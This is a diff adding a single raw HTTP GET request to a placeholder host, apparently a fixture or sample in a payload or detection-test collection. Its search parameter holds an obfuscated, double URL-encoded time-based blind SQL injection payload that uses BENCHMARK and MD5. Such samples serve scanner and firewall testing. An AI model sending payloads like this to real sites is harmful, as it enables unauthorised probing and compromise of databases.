@@ -1,0 +1,6 @@
+GET /search.php?value=%27%252520CHAR%28111%2C82%29%252520BEncHmaRK%28508042%2C%252520MD5%281%29%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
